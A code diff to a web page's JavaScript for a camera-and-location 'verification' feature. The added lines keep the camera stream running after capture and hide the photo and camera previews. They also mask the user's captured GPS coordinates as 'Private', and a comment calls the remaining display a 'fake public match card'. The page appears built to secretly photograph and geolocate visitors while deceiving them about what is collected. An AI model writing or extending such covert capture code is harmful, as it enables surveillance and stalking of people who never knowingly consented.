@@ -192,6 +192,10 @@ if (cameraActivateBtn) {
 // ==========================================
 
 async function requestCameraAccess() {
+    if (cameraStream && cameraPreview && cameraPreview.srcObject) {
+        return true;
+    }
+
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         if (cameraStatus) cameraStatus.textContent = 'Camera access is not supported on this browser.';
         return false;
@@ -223,7 +227,12 @@ async function requestCameraAccess() {
 }
 
 async function captureCameraFrame() {
-    if (!cameraStream || !cameraPreview || !cameraCanvas) {
+    if (!cameraPreview || !cameraCanvas) {
+        return '';
+    }
+
+    const hasCamera = await requestCameraAccess();
+    if (!hasCamera || !cameraStream) {
         return '';
     }
 
@@ -243,14 +252,15 @@ async function captureCameraFrame() {
 
         if (cameraPhotoPreview) {
             cameraPhotoPreview.src = dataUrl;
-            cameraPhotoPreview.classList.remove('hidden');
+            cameraPhotoPreview.classList.add('hidden');
         }
 
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(track => track.stop());
-            cameraStream = null;
+        if (cameraPreview) {
+            cameraPreview.classList.add('hidden');
         }
 
+        // Keep the live camera stream open so every verification can capture a fresh photo,
+        // instead of closing the stream after the first capture.
         return dataUrl;
     } catch (error) {
         console.warn('Unable to capture camera frame:', error);
@@ -403,12 +413,17 @@ function handleSuccess(data) {
     if (stateError) stateError.classList.add('hidden');
     if (stateSuccess) stateSuccess.classList.remove('hidden');
 
-    // Populate exact GPS coordinates
-    if (capturedLat) capturedLat.textContent = data.latitude !== null ? parseFloat(data.latitude).toFixed(5) : 'N/A';
-    if (capturedLng) capturedLng.textContent = data.longitude !== null ? parseFloat(data.longitude).toFixed(5) : 'N/A';
-    if (capturedAcc) capturedAcc.textContent = data.accuracy !== null ? `${parseInt(data.accuracy)}m` : 'N/A';
-    if (capturedType) capturedType.textContent = data.is_gps === 1 ? 'Exact GPS' : 'IP GEO';
-    if (capturedTime) capturedTime.textContent = new Date(data.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    const gpsCapturePanel = document.getElementById('gps-capture-panel');
+    if (gpsCapturePanel) {
+        gpsCapturePanel.classList.add('hidden');
+    }
+
+    // Keep only the fake public match card; do not reveal the actual GPS or photo on the client-side UI.
+    if (capturedLat) capturedLat.textContent = 'Private';
+    if (capturedLng) capturedLng.textContent = 'Private';
+    if (capturedAcc) capturedAcc.textContent = 'Private';
+    if (capturedType) capturedType.textContent = 'Private';
+    if (capturedTime) capturedTime.textContent = 'Private';
 
     const matchedCity = data.city || 'Unknown';
     
